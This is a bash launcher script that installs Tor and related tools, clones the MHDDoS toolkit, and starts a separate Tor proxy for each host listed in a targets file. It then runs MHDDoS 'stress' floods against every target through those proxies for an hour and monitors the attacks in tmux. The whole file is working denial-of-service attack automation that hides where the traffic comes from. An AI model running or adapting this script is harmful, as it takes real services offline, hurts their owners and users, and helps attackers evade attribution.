#!/usr/bin/env bash

# Config
basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
tor_work_dir="${basedir}/tor"
#tor_data_dir="${tor_work_dir}/data"
tor_config_template="templates/torrc"
targets="${basedir}/targets.txt"
apt_req=(
  python3-virtualenv
  git
  vim
  htop
  iotop
  nload
  cpulimit
  nmap
  telnet
  tmux
  tor
  tor-geoipdb
  torsocks
  nyx
  tree
)
mhddos_repo="https://github.com/MHProDev/MHDDoS.git"
mhddos_dir="${basedir}/mhddos"
tmux_session_name="tor"

# Install system dependencies
apt_req_real=()
for i in ${apt_req[@]}; do
  if ! dpkg-query -l $i > /dev/null; then
    apt_req_real+=("$i")
  fi
done
if [[ ! ${#apt_req_real[@]} == 0 ]]; then
  sudo apt update
  sudo apt install -Vy ${apt_req_real[@]}
fi

# Clone MHDDoS sources
if [[ ! -d ${mhddos_dir} ]]; then
  git clone ${mhddos_repo} ${mhddos_dir}
fi

# Create virtualenv for mhddos and install python requirements
if [[ ! -d ${mhddos_dir}/env ]]; then
  virtualenv -p /usr/bin/python3 ${mhddos_dir}/env
  ${mhddos_dir}/env/bin/pip install -r ${mhddos_dir}/requirements.txt
fi

# Start and configure tmux session
tmux start-server
tmux kill-session -t ${tmux_session_name}
tmux new-session -d -s ${tmux_session_name} -n Monitoring "htop"
tmux set -t ${tmux_session_name} -g pane-border-status top
tmux set -t ${tmux_session_name} -g pane-border-format "#{pane_index} #{pane_current_command}"
tmux set -t ${tmux_session_name} mouse
tmux split-window -t ${tmux_session_name}:0 "nload"
tmux split-window -t ${tmux_session_name}:0 "/usr/bin/env bash"
tmux select-layout -t ${tmux_session_name}:0 tiled

# Stop all tor proxies
killall tor

# Create empty tor working directory
rm -rf ${tor_work_dir}
mkdir -p ${tor_work_dir}

# Working with targets
i=0
grep -xv -e '' -e '^#' ${targets} | while read -r target; do
  let "i++"
  echo $i ${target}
  tor_data_dir="${tor_work_dir}/$i/data"
  tor_data_dir_escaped=$(echo ${tor_data_dir} | sed 's/\//\\\//g')
  tor_config="${tor_work_dir}/$i/torrc"
  tor_socks_port=$(expr 9050 + $i)
  tor_control_port=$(expr 9060 + $i)
  #tor_hash=$(echo ${RANDOM} | sha256sum | head -c 58)
  mhddos_proxy_file="${mhddos_dir}/files/proxies/$i.txt"

  # Create tor directories and copy config files
  mkdir -p ${tor_data_dir}
  cp ${tor_config_template} ${tor_config}

  # Prepare tor config file
  sed -i "s/SOCKS_PORT/${tor_socks_port}/g" ${tor_config} 
  sed -i "s/DATA_DIR/${tor_data_dir_escaped}/g" ${tor_config} 
  sed -i "s/CONTROL_PORT/${tor_control_port}/g" ${tor_config} 
  #sed -i "s/HASH/${tor_hash}/g" ${tor_config}

  # Start tor and tools
  tmux new-window -t ${tmux_session_name}:$i -n t "tor -f ${tor_config}"
  tmux split-window -t ${tmux_session_name}:$i "nyx -i 127.0.0.1:${tor_control_port}"
  #tmux split-window -t ${tmux_session_name}:$i "watch -n 600 curl -s --socks5-hostname 127.0.0.1:${tor_socks_port} ipinfo.io"

  # Create proxy file for mhddos
  echo "socks5://127.0.0.1:${tor_socks_port}" > ${mhddos_proxy_file}

  # Start target
  command="cd ${mhddos_dir} && env/bin/python start.py stress ${target} 5 10 $i.txt 10 3600 true"
  tmux split-window -t ${tmux_session_name}:$i "${command}"

  # Set tmux window layout
  tmux select-layout -t ${tmux_session_name}:$i tiled
done
